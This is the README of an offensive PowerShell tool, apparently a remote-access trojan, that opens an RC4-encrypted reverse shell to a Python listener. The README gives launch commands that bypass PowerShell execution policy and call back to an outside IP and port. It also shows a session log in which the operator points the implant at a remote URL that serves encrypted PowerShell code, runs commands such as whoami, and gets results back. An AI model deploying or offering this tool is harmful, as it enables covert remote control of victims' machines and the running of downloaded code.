# RC4-PowerShell-RAT
Small powershell reverse shell using RC4 encryption

# Usage
```
PS-RemoteShell -ip 1.1.1.1 -port 1111 -key test
```
```
$ python PsShellClient.py
PS-RemoteShell Python Client v1.0
Mr.Un1k0d3r RingZer0 Team


Usage: PsShellClient.py ip port key

$ python PsShellClient.py 0.0.0.0 1111 test
```

# Example
```
powershell -exec bypass Import-Module .\PS-RemoteShell.ps1; PS-RemoteShell -ip 1.1.1.1 -port 1111 -key test
```

```
$ python PsShellClient.py 10.0.0.144 8080 test
PS-RemoteShell Python Client v1.0
Mr.Un1k0d3r RingZer0 Team


[*] Waiting for a connection...
[+] Callback from 10.0.0.144:49758
(192.168.70.133:RINGZER0\ME):Url >https://home.ringzer0team.com/ps.php
(https://home.ringzer0team.com/ps.php):Exec >Get-BrowserHomepage

Start Page
----------
http://go.microsoft.com/fwlink/p/?LinkId=255141



(192.168.70.133:RINGZER0\ME):Url >null
(null):Exec >whoami
RINGZER0\ME

(192.168.70.133:RINGZER0\ME):Url >

The ps.php file located at https://home.ringzer0team.com/ps.php is encrypted using the following key: test
```

# Credit 
Mr.Un1k0d3r RingZer0 Team

https://ringzer0team.com
